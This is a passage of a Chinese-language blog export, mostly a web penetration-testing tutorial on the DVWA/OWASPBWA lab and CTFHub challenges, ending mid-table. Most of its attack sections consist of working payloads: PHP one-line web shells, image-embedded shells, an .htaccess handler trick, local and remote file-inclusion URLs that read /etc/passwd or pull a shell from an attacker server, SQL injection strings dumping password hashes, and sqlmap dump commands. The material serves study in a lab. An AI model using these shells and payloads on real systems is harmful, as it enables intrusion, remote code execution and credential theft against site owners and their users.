0;\n}\n```\n\n","categories":["Windows逆向"],"tags":["IDA","OllyDbg"]},{"title":"吾爱破解2022春节——Android中级题","url":"/posts/8b4ac9a8.html","content":"\n不会有人因为这道题所以去学了Android逆向吧？！！是的是我本人，为了能更好看懂Android程序还在寒假学了Java。所以这道题这么久才能跟你们见面。\n\n<!--more-->\n\n在AK看到apk有lib文件，说明调用了so文件。是arm64-v8a架构的。完蛋了AS模拟器也运行不了arm64-v8a架构的。\n\n{% asset_img 1.png jeb简单分析 %}\n\n先不管了，拖进IDA64看看情况。Native函数有两种定义方法，一种是按照类名函数名静态声明并导出，一种是在`JNI_OnLoad`里调用`vm -> GetEnv -> RegisterNatives`动态声明。看一眼它的导出表，发现并没有导出`checkSn`函数，那么就说明是`JNI_OnLoad`里动态注册的。\n\n那...接下来就动态调试啦，要真机调试啊救命！","categories":["Android逆向"],"tags":["IDA","Android Killer"]},{"title":"Web渗透","url":"/posts/54924480.html","content":"\n文章知识点建立在OWASPBWA靶机与CTFHub实验的基础上。\n\n总实验准备：\n\nkali虚拟机、OWASPBWA靶机、win10、XShell\n\n<!--more-->\n\n# 1. 文件上传漏洞\n\n## 1.1 文件上传漏洞[低]\n\n```\n一句话木马，中国菜刀\n```\n\n靶机一定要用NAT连接，桥接方式不安全。因为用靶机复制不了不方便做笔记，所以我用XShell将靶机终端连接在物理机上。查看靶机的IP地址：\n\n```ubuntu\nroot@owaspbwa:~# dhclient eth0\nThere is already a pid file /var/run/dhclient.pid with pid 2890\nkilled old client process, removed PID file\nInternet Systems Consortium DHCP Client V3.1.3\nCopyright 2004-2009 Internet Systems Consortium.\nAll rights reserved.\nFor info, please visit https://www.isc.org/software/dhcp/\n\nListening on LPF/eth0/00:0c:29:40:b1:22\nSending on   LPF/eth0/00:0c:29:40:b1:22\nSending on   Socket/fallback\nDHCPREQUEST of 192.168.137.146 on eth0 to 255.255.255.255 port 67\nDHCPACK of 192.168.137.146 from 192.168.137.254\nbound to 192.168.137.146 -- renewal in 685 seconds.\n```\n\n在物理机输入靶机的IP地址**192.168.137.146**，在选项中找到Damn Vulnerable Web Application进入，用户名和密码均为admin。在左侧找到upload，可以试着选择文件上传，但文件大小不能过大，否则上传失败。在右下角处查看后端源码：\n\n```php\n<?php\n    if (isset($_POST['Upload'])) {\n\n            $target_path = DVWA_WEB_PAGE_TO_ROOT.\"hackable/uploads/\";\n            $target_path = $target_path . basename( $_FILES['uploaded']['name']);\n\n            if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {\n                \n                echo '<pre>';\n                echo 'Your image was not uploaded.';\n                echo '</pre>';\n                \n              } else {\n            \n                echo '<pre>';\n                echo $target_path . ' succesfully uploaded!';\n                echo '</pre>';\n                \n            }\n\n        }\n?>\n```\n\n源码告诉我们上传的文件没有限制是图片，并且它保存的路径在当前目录的/hackable/uploads上。我们将一句话木马shell1.php文件上传到系统中。\n\n```php\n<?php @eval($_POST['caidao']);?>\n```\n\n打开中国菜刀，右键添加地址：http://192.167.137.146/dvwa/hackable/uploads/shell1.php，后面小框填$_POST[]中的内容，即caidao。选中地址右键就可以开始搞事情了。\n\n在菜刀中添加地址的下面有个配置框，如果知道系统的数据库密码，还可以查看系统的数据库。\n\n```html\n<T>MYSQL</T>\n<H>loaclhost</H>\n<U>root</U>\n<P>owaspbwa</P>\n```\n\n## 1.2 文件上传漏洞[中]\n\n```\nBurpSuite，一句话木马，中国菜刀\n```\n\n在左侧DVWA Security可以选择安全性，这次选中级。\n\n查看一下后端源代码：\n\n```php\n<?php\n    if (isset($_POST['Upload'])) {\n\n            $target_path = DVWA_WEB_PAGE_TO_ROOT.\"hackable/uploads/\";\n            $target_path = $target_path . basename($_FILES['uploaded']['name']);\n            $uploaded_name = $_FILES['uploaded']['name'];\n            $uploaded_type = $_FILES['uploaded']['type'];\n            $uploaded_size = $_FILES['uploaded']['size'];\n\n            if (($uploaded_type == \"image/jpeg\") && ($uploaded_size < 100000)){\n\n\n                if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {\n                \n                    echo '<pre>';\n                    echo 'Your image was not uploaded.';\n                    echo '</pre>';\n                    \n                  } else {\n                \n                    echo '<pre>';\n                    echo $target_path . ' succesfully uploaded!';\n                    echo '</pre>';\n                    \n                    }\n            }\n            else{\n                echo '<pre>Your image was not uploaded.</pre>';\n            }\n        }\n?>\n```\n\n我们发现多添加了一个条件判断，上传mime类型是image/jpeg，即只能上传后缀为.jpg和.jpeg的文件，并且文件大小要小于100000b。直接上传一句话木马shell1.php肯定是不行的。\n\n先将之前放进uploads的所有文件删除：\n\n```\nroot@owaspbwa:~# cd /var/www/dvwa\nroot@owaspbwa:/var/www/dvwa# ls\nabout.php     docs         hackable          login.php    README.md     vulnerabilities\nCHANGELOG.md  dvwa         ids_log.php       logout.php   robots.txt\nconfig        external     index.php         phpinfo.php  security.php\nCOPYING.txt   favicon.ico  instructions.php  php.ini      setup.php\nroot@owaspbwa:/var/www/dvwa# cd hackable/uploads\nroot@owaspbwa:/var/www/dvwa/hackable/uploads# ls\ndvwa_email.png\tshell1.php\nroot@owaspbwa:/var/www/dvwa/hackable/uploads# rm -rf *\n```\n\n记住记住！！删除当前目录下所有文件的命令是**rm -rf ***，不是**rm -rf /***，这是删库跑路！！血的教训...\n\n所以我们要用到burpsuite，在火狐浏览器中设置为本地代理后，将发送一句话木马shell1.php的包进行拦截，将包中的Content-Type改为image/jpeg伪造成图片类型。\n\n```\nPOST /dvwa/vulnerabilities/upload/ HTTP/1.1\n\nHost: 192.168.137.146\n\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n\nAccept-Language: en-US,en;q=0.5\n\nAccept-Encoding: gzip, deflate\n\nContent-Type: multipart/form-data; boundary=---------------------------115689382727075237242790069120\n\nContent-Length: 509\n\nOrigin: http://192.168.137.146\n\nConnection: close\n\nReferer: http://192.168.137.146/dvwa/vulnerabilities/upload/\n\nCookie: security=medium; PHPSESSID=rdm26d89oh6rmfrfi1khqpkul7; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada\n\nUpgrade-Insecure-Requests: 1\n\n\n\n-----------------------------115689382727075237242790069120\n\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\n\n\n\n100000\n\n-----------------------------115689382727075237242790069120\n\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"shell1.php\"\n\nContent-Type: application/x-php\t\t//改为image/jpeg\n\n\n\n<?php @eval($_POST['caidao']);?>\n\n\n-----------------------------115689382727075237242790069120\n\nContent-Disposition: form-data; name=\"Upload\"\n\n\n\nUpload\n\n-----------------------------115689382727075237242790069120--\n\n\n```\n\n再发送出去，系统以为我们发送的是图片类型，但实际我们发送的是一句话木马，再用中国菜刀就可以了。\n\n本来想用kali直接渗透，因为Kali本机就装有burp suite，所以很方便，但不会用kali的weevely——类似于中国菜刀的程序，故放弃。\n\n在物理机装好burpsuite，弄好代理，就跟上述操作一样。\n\n## 1.3 文件上传漏洞[高]\n\n查看后端源码：\n\n```php\n<?php\nif (isset($_POST['Upload'])) {\n\n            $target_path = DVWA_WEB_PAGE_TO_ROOT.\"hackable/uploads/\";\n            $target_path = $target_path . basename($_FILES['uploaded']['name']);\n            $uploaded_name = $_FILES['uploaded']['name'];\n            $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, '.') + 1);\n            $uploaded_size = $_FILES['uploaded']['size'];\n\n            if (($uploaded_ext == \"jpg\" || $uploaded_ext == \"JPG\" || $uploaded_ext == \"jpeg\" || $uploaded_ext == \"JPEG\") && ($uploaded_size < 100000)){\n\n\n                if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {\n                    \n                    echo '<pre>';\n                    echo 'Your image was not uploaded.';\n                    echo '</pre>';\n                \n                  } else {\n                \n                    echo '<pre>';\n                    echo $target_path . ' succesfully uploaded!';\n                    echo '</pre>';\n                    \n                    }\n            }\n            \n            else{\n                \n                echo '<pre>';\n                echo 'Your image was not uploaded.';\n                echo '</pre>';\n\n            }\n        }\n\n?> \n```\n\n这次的条件判断语句是直接检查文件的后缀，上面两种方法都不行。那我们只能是上传图片，如果图片中含有木马，那我们也可以用中国菜刀拿下这个系统。\n\n攻击方法要与文件包含漏洞[低]结合。\n\n## 1.4 一句话木马\n\n```php+HTML\nshell1.php\n<?php @eval($_POST['caidao']);?>\n\nshell2.php\n<?php eval($_REQUEST['cmd']);?>\t\nhttp://192.168.137.146/dvwa/hackable/uploads/shell2.php?cmd=system(\"pwd\");\n\nshell3.php\n<?php system($_REQUEST['chopper']);?>\nhttp://192.168.137.146/dvwa/hackable/uploads/shell3.php?chopper=ls /\n\nshell4.jpg\nshell4.php\n<?php fputs(fopen(\"shell4.php\",\"w\"), '<?php eval($_POST[caidao]);?>');?>\ncopy hello.jpg/b+shell4.php/a shell4.jpg\n\nshell5.phtml\n<script language='php'>@eval($_POST['caidao']);</script>\n<script language='php'>system('cat /flag');</script>\n\nshell6.php\n#加上图片文件头\n```\n\n## 1.5 weevly用法\n\n```\nweevly generate [password] [filename]\t生成一个木马文件\nweevly [url to file] [password]\t连接到服务器\n```\n\n## 1.6 .htaccess\n\n.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过.htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。\n\n构造.htaccess文件：\n\n```php+HTML\n<FilesMatch \"sj\">\n SetHandler application/x-httpd-php\n</FilesMatch>\n#FileMathch参数即为文件名的正则匹配，标签内的意思是将sj文件当成php文件解析\n```\n\n 构造sj文件：\n\n```php\n<?php passthru(\"ls /\"); ?>\n<?php passthru(\"ls /var/www/html\"); ?>\n<?php passthru(\"cat /var/www/html/flag.php\"); ?>\n<?php passthru(\"find / -name flag\"); ?>#这个不行\n```\n\n## 1.7 00截断\n\n在url中%00表示ascii码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。\n\n参考如下文章：https://writeup.ctfhub.com/Skill/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/gr98bRUp63TUwcHiaLZzEf.html\n\n\n\n# 2. 文件包含漏洞\n\n文件包含类似于C语言的include头文件，python的import文件，也类似于函数调用。\n\n## 2.1 本地文件包含(LFI)\n\nURL格式如下：\n\n```\nhttp://7ce7fcde-b026-4e63-a0f1-11442ec86169.node4.buuoj.cn:81/?file=hint.php?../../../../../ffffllllaaaagggg\n```\n\n```\nhttp://192.168.137.146/dvwa/vulnerabilities/fi/index.php?page=include.php\n\n#include.php和a.jpg与index.php在同一目录\nhttp://192.168.137.146/dvwa/vulnerabilities/fi/index.php?page=a.jpg\t\t\n\n#/ect/passwd与index.php路径不同，也可以执行\nhttp://192.168.137.146/dvwa/vulnerabilities/fi/index.php?page=/etc/passwd\t\n```\n\nURL中带参数，定位到服务器的某个目录某个文件中。\n\n```php\nWAF的问题：WAF不允许num传入字母，那我们可以在num前加个空格来绕过WAF\n/calc.php? num=print_r(scandir('/'));\t列出参数目录中的文件和目录，这里由于单引号和斜杠被过滤了，那就用chr()绕过，chr(47)就是斜杠/\n/calc.php? num=print_r(scandir(chr(47)));\n/calc.php? num=print_r(file_get_contents('/flagg'));\t读取flagg文件\n/calc.php? num=print_r(file_get_contents(chr(47).'flagg'));\t如果只绕过/，后面的引号又被过滤掉了，所以将所有字符都换成chr()\n这里/=chr(47)，f=chr(102),l=chr(49),a=chr(97),g=chr(103),g=chr(103)来进行绕过\n/calc.php? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));\t.表示连接\n```\n\n有时候下载下来的txt文件貌似找不到flag，但将txt文件放在URL中就可找到flag。\n\n```php\n读敏感文件\n?file=/etc/passwd\n\n利用封装协议读源代码,能看到php文件源码\n?file=php://filter/read=convert.base64-encode/resource=index.php\n\n包含图片Getshell\n在上传的图片中写入恶意代码，然后用本地文件包含调用，就会执行图片里的php代码\n\n包含日志文件Getshell\n路径\napache:/var/log/apache2/access.log\nnginx:/var/log/nginx/access.log\n\nsession文件包含Getshell\n?file=/var/log/nignx/access.log\n\n照片木马制作\ncopy 1.jpg/b + 1.php/a 2.jpg\n```\n\n## 2.2 远程文件包含(RFI)\n\nURL格式如下：\n\n```\nhttp://192.168.137.146/dvwa/vulnerabilities/fi/index.php?page=http://web_server/b.jpg\n```\n\nPHP的配置选项allow_url_include为ON的话，则include/require函数可以加载远程文件，这种漏洞被称为\"远程文件包含漏洞\"，远程文件包含更容易实现。\n\n`allow_url_fopen = On` 是否允许打开远程文件； `allow_url_include = On` 是否允许include/require远程文件。\n\n```\nhttp://challenge-d46d08980443a4ef.sandbox.ctfhub.com:10080/?file=http://你的服务器地址:8000/shell1.php\n```\n\n## 2.3 利用php://filter伪协议\n\n如果想要读取本地的PHP文件，可以用php://filter伪协议。\n\n当与包含函数结合时，php://filter流会被当作php文件执行。这时，如果我们不想让它执行，只是想查看源码，可以对其进行编码。\n\n```\nhttp://2be338a6-7ba2-453a-b873-4b4b7a4b4221.node4.buuoj.cn:81/?file=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n## 2.4 文件包含漏洞[低]\n\n结合文件上传漏洞[高]，我们用**本地文件包含**。思路是上传图片木马，即图片中包含生成木马的代码，如果系统有文件包含漏洞，就可以执行图片中的代码，生成木马。\n\n利用php://fileter伪协议进行文件包含。\n\n查看源码：\n\n```php\n<?php\n\n    $file = $_GET['page']; //The page we wish to display \n\n?> \n```\n\n$_GET函数表示参数会显示在地址栏上，默认地址为：\n\n```\nhttp://192.168.137.146/dvwa/vulnerabilities/fi/?page=include.php\n```\n\n准备一张小一点的图片hello.jpg，一个木马：\n\n```php\nshell4.php\n<?php fputs(fopen(\"shell4.php\",\"w\"), '<?php eval($_POST[caidao]);?>');?>\n```\n\n用cmd生成一个图片木马hi.jpg：\n\n```\ncopy hello.jpg/b + shell4.php/a hi.jpg\n```\n\n将图片放入winhex拉到最下面就可以看到木马已经放进图片中了。（或者用记事本打开图片也能看到）\n\n将图片上传后，去到文件包含漏洞页面，执行payload：\n\n```\nhttp://192.168.137.146/dvwa/vulnerabilities/fi/index.php?page=../../hackable/uploads/hi.jpg\n\n//dvwa文件上传访问的目录\n/var/www/dvwa/hackable/uploads\t\n\n//dvwa文件包含访问的目录\n/var/www/dvwa/vulnerabilities/fi\t\n```\n\n执行完后网页会出现一堆乱码，别管它，关键是会在/var/www/dvwa/vulnerabilities/fi目录下生成一个shell4.php文件，正是我们放进图片中的代码生成的一句话木马。\n\n写入菜刀地址：http://192.168.137.146/dvwa/vulnerabilities/fi/shell4.php和密码，成功渗透。\n\n**远程文件包含**\n\n```\nip a\t//查看IP地址：192.168.137.144\n```\n\n```php\n#将txt文件写进攻击机服务器的站点\nvim /var/www/html/chopper.txt\n<?php fputs(fopen(\"shell4.php\",\"w\"),'<?php eval($_POST[caidao]);?>');?>\n```\n\n可以打开http://192.168.137.144/chopper.txt试试，如果正常显示我们写进去的内容说明路径没错。\n\npayload：\n\n```\nhttp://192.168.137.146/dvwa/vulnerabilities/fi/?page=http://192.168.137.144/chopper.txt\n```\n\n执行后在/var/www/dvwa/vulnerabilities/fi目录下生成一个shell4.php文件，成功。\n\n## 2.2 文件包含漏洞[中]\n\n查看源码：\n\n```php\n<?php\n\n    $file = $_GET['page']; // The page we wish to display \n\n    // Bad input validation\n    $file = str_replace(\"http://\", \"\", $file);\n    $file = str_replace(\"https://\", \"\", $file);        \n\n?> \n```\n\n源码的意思是将参数中含有\"http://\"，\"https://\"替换成空，这时只要将限制字符串重写：\n\n```\nhttp://192.168.137.146/dvwa/vulnerabilities/fi/?page=httphttp://://192.168.137.144/chopper.txt\n\n把中间的http://替换成空，前后一合并就可以访问到远程服务器\n```\n\n第二种方法是用本地文件包含来做，同[低]。\n\n## 2.3 文件包含漏洞[高]\n\n查看源码：\n\n```php\n<?php\n        \n    $file = $_GET['page']; //The page we wish to display \n\n    // Only allow include.php\n    if ( $file != \"include.php\" ) {\n        echo \"ERROR: File not found!\";\n        exit;\n    }\n        \n?> \n```\n\n基本锁死了。\n\n**小知识**\n\nrobots.txt是爬虫的君子协议，说明哪些目录是不能爬的，一般直接在网址后面输入/robots.txt就可看到，但同时也有一点此地无银三百两的意思，说明这些目录很重要。\n\nCtrl + L清空终端界面\n\n# 3. SQL注入\n\n危害：\n\n1. 数据库信息泄漏：数据库中存放的用户的隐私信息的泄露\n2. 网页篡改：通过操作数据库对特定网页进行篡改\n3. 数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员账户被篡改\n4. 服务器被远程控制：被安装后门\n\nMySQL基础操作：\n\n```\nshow databases;\t\t\t\t\t查看数据库\nuse database_name;\t\t\t\t使用数据库\nshow tables;\t\t\t\t\t查看表\ndesc table_name;\t\t\t\t查看表结构\nselect * from table_name;\t\t查看表数据\ncreate database database_name;\t创建数据库\ndrop database database_name;\t删除数据库\n```\n\n常用变量：\n\n```\ndatabase()\t查看当前数据库名\tselect database();\nuser()\t\t查看当前用户\t\t select user();\nversion()\t查看版本\t\t   select version();\nshow variables like'%datadir%';\t\t查看安装路径\n```\n\n```\nunion select 1,2,database()\nunion select 1,2,group_concat(table_name) from information_sehema.tables where table_schema=database()\nunion select 1,2,group_concat(column_name) from information_schema.columns where table_name='xxx'\nunion select 1,2,group_concat(column1_name,column2_name) from xxx\n```\n\n**information_schema库**\n\ninformation_schema是非常重要的库，是数据库字典，包含所有数据库的库信息，表信息。\n\n查询数据库名为dvwa的所有表：\n\n```mysql\nmysql> select TABLE_SCHEMA,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='dvwa';\n+--------------+------------+\n| TABLE_SCHEMA | TABLE_NAME |\n+--------------+------------+\n| dvwa         | guestbook  |\n| dvwa         | users      |\n+--------------+------------+\n2 rows in set (0.08 sec)\n```\n\n查询数据库名为dvwa的users表的所有列：\n\n```mysql\nmysql> select COLUMN_NAME from information_schema.columns where TABLE_SCHEMA='dvwa' and TABLE_NAME='users';\n+-------------+\n| COLUMN_NAME |\n+-------------+\n| user_id     |\n| first_name  |\n| last_name   |\n| user        |\n| password    |\n| avatar      |\n+-------------+\n6 rows in set (0.03 sec)\n```\n\n## 3.1 错误注入\n\n### 3.1.1 SQL注入(低)\n\n输入'——单引号，就是要让页面报错，说明它能够接受单引号，有注入点。\n\n```\n1' or 1=1#\n1' union select 1#\n1' order by 4 -- d\n-1' union select 1,2,3 -- +\n-1 union select 1,database()\n```\n\n有时会将select,from,or,where等关键字过滤，可以将这些关键字进行重写：\n\n```\n' ununionion seleselectct 1,database(),group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='geek'#\n\n' ununionion seleselectct 1,database(),group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='b4bsql'#\n\n' ununionion seleselectct 1,database(),group_concat(id,username,passwoorrd) frfromom b4bsql#\n```\n\n| 过滤关键字 | 绕过方法之一         | 绕过方法之二 | 绕过方法之三 |\n| ---------- | -------------------- | ------------ | ------------ |\n| select     | 重写                 | 大小写       | selec\\x74    |\n| or         | 重写                 | 大小写       | o\\x72        |\n| union      | 重写                 | 大小写       | unio\\x6e     |\n| 空格       | #、--、//、/**/、%00 | %2520        | '            |\n\n输入'——单引号，就是要让页面报错，说明它能够接受单引号，有注入点。\n\n查看源码：\n\n```php\n<?php    \n\nif(isset($_GET['Submit'])){\n    \n    // Retrieve data\n    \n    $id = $_GET['id'];\n\n    $getid = \"SELECT first_name, last_name FROM users WHERE user_id = '$id'\";\n    $result = mysql_query($getid) or die('<pre>' . mysql_error() . '</pre>' );\n\n    $num = mysql_numrows($result);\n\n    $i = 0;\n\n    while ($i < $num) {\n\n        $first = mysql_result($result,$i,\"first_name\");\n        $last = mysql_result($result,$i,\"last_name\");\n        \n        echo '<pre>';\n        echo 'ID: ' . $id . '<br>First name: ' . $first . '<br>Surname: ' . $last;\n        echo '</pre>';\n\n        $i++;\n    }\n}\n?>\n```\n\n在源码上可以看到我们输入的东西根据这条语句去查询：\n\n```php\n$getid = \"SELECT first_name, last_name FROM users WHERE user_id = '$id'\";\n```\n\n意思是将我们输入的ID的名字显示出来，但如果输入**' or 1=1 -- ddd**，整条语句变为\n\n```php\n$getid = \"SELECT first_name, last_name FROM users WHERE user_id = '' or 1=1 -- ddd '\";\n```\n\n输入的单引号与源码的单引号闭合，1=1永远为真，--是注释后面所有。1=1把所有元组显示出来：\n\n```\nID: ' or 1=1 -- ddd\nFirst name: admin\nSurname: admin\n\nID: ' or 1=1 -- ddd\nFirst name: Gordon\nSurname: Brown\n\nID: ' or 1=1 -- ddd\nFirst name: Hack\nSurname: Me\n\nID: ' or 1=1 -- ddd\nFirst name: Pablo\nSurname: Picasso\n\nID: ' or 1=1 -- ddd\nFirst name: Bob\nSurname: Smith\n\nID: ' or 1=1 -- ddd\nFirst name: user\nSurname: user\n```\n\n但这个只局限于这张表的first_name和last_name，再也查不出其它东西来，于是我们可以通过联合查询，查询其他列甚至其他表。\n\n在不知道源码的情况下，输入单引号页面报错，说明有注入漏洞。我们可以输入union试字段**' union select 1 -- d**，页面报错：\n\n```\nThe used SELECT statements have a different number of columns\n```\n\n试**' union select 1,2 -- d**，没报错，说明字段是2\n\n```\nID: ' union select 1,2 -- d\nFirst name: 1\nSurname: 2\n```\n\n试**' union select user(),database() -- d**，获得当前用户和当前数据库：\n\n```\nID: ' union select user(),database() -- d\nFirst name: dvwa@localhost\nSurname: dvwa\n```\n\n试**' union select table_schema,1 from information_schema.tables -- dd**，查询所有库名：\n\n```\nID: ' union select table_schema,1 from information_schema.tables -- dd\nFirst name: information_schema\nSurname: 1\n\nID: ' union select table_schema,1 from information_schema.tables -- dd\nFirst name: dvwa\nSurname: 1\n```\n\n网页只显示了两个库，因为这个用户的权限只能看到这两个库。\n\n试**' union select table_schema,table_name from information_schema.tables where table_schema='dvwa' -- dd**，查询dvwa库的所有表：\n\n```\nID: ' union select table_schema,table_name from information_schema.tables where table_schema='dvwa' -- dd\nFirst name: dvwa\nSurname: guestbook\n\nID: ' union select table_schema,table_name from information_schema.tables where table_schema='dvwa' -- dd\nFirst name: dvwa\nSurname: users\n```\n\n试**' union select 1,column_name from information_schema.columns where table_name='users' -- dd**，查询users表中的列：\n\n```\nID: ' union select 1,column_name from information_schema.columns where table_name='users' -- dd\nFirst name: 1\nSurname: user_id\n\nID: ' union select 1,column_name from information_schema.columns where table_name='users' -- dd\nFirst name: 1\nSurname: first_name\n\nID: ' union select 1,column_name from information_schema.columns where table_name='users' -- dd\nFirst name: 1\nSurname: last_name\n\nID: ' union select 1,column_name from information_schema.columns where table_name='users' -- dd\nFirst name: 1\nSurname: user\n\nID: ' union select 1,column_name from information_schema.columns where table_name='users' -- dd\nFirst name: 1\nSurname: password\n\nID: ' union select 1,column_name from information_schema.columns where table_name='users' -- dd\nFirst name: 1\nSurname: avatar\n```\n\n知道表中的列名后，可以根据列查询对应列的数据，比如查询账号密码**' union select user,password from users -- dd**：\n\n```\nID: ' union select user,password from users -- dd\nFirst name: admin\nSurname: 21232f297a57a5a743894a0e4a801fc3\n\nID: ' union select user,password from users -- dd\nFirst name: gordonb\nSurname: e99a18c428cb38d5f260853678922e03\n\nID: ' union select user,password from users -- dd\nFirst name: 1337\nSurname: 8d3533d75ae2c3966d7e0d4fcc69216b\n\nID: ' union select user,password from users -- dd\nFirst name: pablo\nSurname: 0d107d09f5bbe40cade3de5c71e9e9b7\n\nID: ' union select user,password from users -- dd\nFirst name: smithy\nSurname: 5f4dcc3b5aa765d61d8327deb882cf99\n\nID: ' union select user,password from users -- dd\nFirst name: user\nSurname: ee11cbb19052e40b07aac0ca060c23ee\n```\n\n密码是MD5加密的，只要找个MD5解密网页就可知道正确密码。\n\n如果我们需要的信息有4列，但系统给的字段只有2列，我们可以用concat()函数实现字符串合并，**' union select password,concat(first_name,' ', last_name,' ', user) from users -- dd**：\n\n```\nID: ' union select password,concat(first_name,' ', last_name,' ', user) from users -- dd\nFirst name: 21232f297a57a5a743894a0e4a801fc3\nSurname: admin admin admin\n\nID: ' union select password,concat(first_name,' ', last_name,' ', user) from users -- dd\nFirst name: e99a18c428cb38d5f260853678922e03\nSurname: Gordon Brown gordonb\n\nID: ' union select password,concat(first_name,' ', last_name,' ', user) from users -- dd\nFirst name: 8d3533d75ae2c3966d7e0d4fcc69216b\nSurname: Hack Me 1337\n\nID: ' union select password,concat(first_name,' ', last_name,' ', user) from users -- dd\nFirst name: 0d107d09f5bbe40cade3de5c71e9e9b7\nSurname: Pablo Picasso pablo\n\nID: ' union select password,concat(first_name,' ', last_name,' ', user) from users -- dd\nFirst name: 5f4dcc3b5aa765d61d8327deb882cf99\nSurname: Bob Smith smithy\n\nID: ' union select password,concat(first_name,' ', last_name,' ', user) from users -- dd\nFirst name: ee11cbb19052e40b07aac0ca060c23ee\nSurname: user user user\n```\n\n在函数被过滤的情况下，可以选择堆叠注入，如：**0';show databases;#**，也可以用contact()连接\n\n```\n1';PREPARE hacker from concat('s','elect', ' * from `1919810931114514` ');EXECUTE hacker;#\n```\n\n## 3.2 时间盲注\n\n输入单引号没有反应，但不一定它没有注入漏洞。可以试一下**3' and sleep(5)#**，给它一个真条件3，闭合，再停留5秒，发现网页会加载5秒，说明有注入点。\n\n### 3.2.1 SQL盲注[低]\n\n```\nID: 3' union select user,password from users -- dd\nFirst name: Hack\nSurname: Me\n\nID: 3' union select user,password from users -- dd\nFirst name: admin\nSurname: 21232f297a57a5a743894a0e4a801fc3\n\nID: 3' union select user,password from users -- dd\nFirst name: gordonb\nSurname: e99a18c428cb38d5f260853678922e03\n\nID: 3' union select user,password from users -- dd\nFirst name: 1337\nSurname: 8d3533d75ae2c3966d7e0d4fcc69216b\n\nID: 3' union select user,password from users -- dd\nFirst name: pablo\nSurname: 0d107d09f5bbe40cade3de5c71e9e9b7\n\nID: 3' union select user,password from users -- dd\nFirst name: smithy\nSurname: 5f4dcc3b5aa765d61d8327deb882cf99\n\nID: 3' union select user,password from users -- dd\nFirst name: user\nSurname: ee11cbb19052e40b07aac0ca060c23ee\n```\n\n## 3.3 堆叠注入\n\n在函数被过滤的情况下，可以选择堆叠注入，如：**0';show databases;#**。也可以用contact()连接：\n\n```\n1';PREPARE hacker from concat('s','elect', ' * from `1919810931114514` ');EXECUTE hacker;#\n```\n\n## 3.4 自动化注入\n\nkali中sqlmap一些用法\n\n```\n-u URL, --url=URL   Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")\n--batch             Never ask for user input, use the default behavior\n-p TESTPARAMETER    Testable parameter(s)\n--dbms=DBMS         Force back-end DBMS to provided value\n--level=LEVEL       Level of tests to perform (1-5, default 1)\n--risk=RISK         Risk of tests to perform (1-3, default 1)\n--dbs\t\t\t\t获取所有数据库\n--current-db\t\t获取当前数据库\n--users\t\t\t\t获取所有用户\n--current-user\t\t获取当前用户\n-D databese_name --tables\t\t\t\t\t获取database_name的所有表\n-D databese_name -T table_name --columns\t获取database_name的table_name的所有列\n-D databese_name -T table_name -C column_name --dump\t获取database_name的table_name的column_name的数据\n--cookie=COOKIE\t\t添加cookie\n```\n\nGET请求注入：\n\n```sql\nsqlmap -u http://challenge-9a6148b6244df91d.sandbox.ctfhub.com:10800/?id=1 --batch --tables\n\nsqlmap -u http://challenge-9a6148b6244df91d.sandbox.ctfhub.com:10800/?id=1 --batch -D sqli -T flag --columns\n\nsqlmap -u http://challenge-9a6148b6244df91d.sandbox.ctfhub.com:10800/?id=1 --batch -D sqli -T flag -C flag --dump\n```\n\nPOST请求注入：\n\n```sql\nsqlmap -u http://challenge-9a6148b6244df91d.sandbox.ctfhub.com:10800 --batch --data=\"id=1&pwd=333\"\n```\n\n遇到过滤情况：\n\n```sql\nsqlmap -u http://challenge-b025f09fc3033f00.sandbox.ctfhub.com:10800/?id=1 --batch --tables --tamper \"space2comment.py\"\n```\n\n脚本名：`space2comment.py` \n\n作用：Replaces space character ' ' with comments  /\\**/。\n\n也就是用注释/**/替换空格字符' '。\n\nsqlmap 中的 tamper 脚本有很多，例如：` equaltolike.py `（作用是用like代替等号）、` apostrophemask.py `（作用是用utf8代替引号）、 `greatest.py` （作用是绕过过滤'>' ，用GREATEST替换大于号）等。\n\n### 3.4.1 自动化注入(低)\n\n进入OWASP Mutillidae Ⅱ（不需要登录），选择左侧全部首一一栏，进入登录界面，随便输入错误的名字密码后，复制网页地址，用sqlmap查看网页是否有sql注入漏洞：\n\n```\nsqlmap -u \"http://192.168.137.146/mutillidae/index.php?page=user-info.php&username=91&password=%3Bohk&user-info-php-submit-button=View+Account+Details\" -p username --batch\t\t//只看username有无注入漏洞\n\n[14:30:48] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu 10.04 (Lucid Lynx)\nweb application technology: PHP 5.3.2, PHP, Apache 2.2.14\nback-end DBMS: MySQL >= 5.0\t\t//数据库、系统、php等都出来了表示有注入漏洞\n[14:30:52] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.137.146'  \n\n//获得表中的数据\nsqlmap -u \"http://192.168.137.146/mutillidae/index.php?page=user-info.php&username=91&password=%3Bohk&user-info-php-submit-button=View+Account+Details\" --batch -D nowasp -T accounts -C username,password --dump\n\nDatabase: nowasp\nTable: accounts\n[24 entries]\n+----------+--------------+\n| username | password     |\n+----------+--------------+\n| admin    | admin        |\n| adrian   | somepassword |\n| john     | monkey       |\n| jeremy   | password     |\n| bryce    | password     |\n| samurai  | samurai      |\n| jim      | password     |\n| bobby    | password     